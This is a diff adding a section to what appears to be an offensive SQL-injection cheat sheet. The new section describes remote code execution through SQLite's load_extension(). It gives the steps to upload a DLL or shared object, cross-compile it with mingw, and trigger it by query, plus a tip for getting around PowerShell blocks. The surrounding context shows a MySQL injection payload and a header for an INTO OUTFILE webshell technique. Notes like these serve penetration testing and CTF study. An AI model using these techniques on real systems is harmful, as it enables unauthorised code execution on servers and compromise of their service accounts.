@@ -115,6 +115,22 @@ admin"/**/&&/**/1=1#                    -- double-quote injection
 
 **Key:** Always check quote context (single vs double) by reading source code. MySQL uses `"` for string literals when `ANSI_QUOTES` is not set. Use `#` for MySQL comments (no trailing space needed, unlike `-- `).
 
+### SQLite load_extension() RCE (Django SQL Explorer / BI Tools)
+When a SQL-explorer-style admin UI hands your query to SQLite with `enable_load_extension=True`:
+```sql
+-- Upload a DLL/SO via any file-write primitive (Django admin banner field, static upload, etc.)
+-- Windows (.dll): cross-compile from Linux/macOS:
+--   x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -Wl,--export-all-symbols
+-- DLL must export sqlite3_extension_init(db, errmsg, api) or sqlite3_<name>_init
+-- Trigger (NOTE: pass path WITHOUT extension — SQLite appends .dll / .so):
+SELECT load_extension('C:\\path\\to\\payload');
+SELECT load_extension('/tmp/payload');
+
+-- Runs as the DB process user (web/app service account).
+-- If PowerShell blocked by GPO, have the DLL launch python.exe to run arbitrary scripts.
+```
+See `sql-injection-advanced.md` for full DLL source + chain details.
+
 ### SQL Injection via Stored Procedure CONCAT + INTO OUTFILE (Webshell)
 When direct `SELECT INTO OUTFILE` is blocked but stored procedures allow string operations:
 ```sql
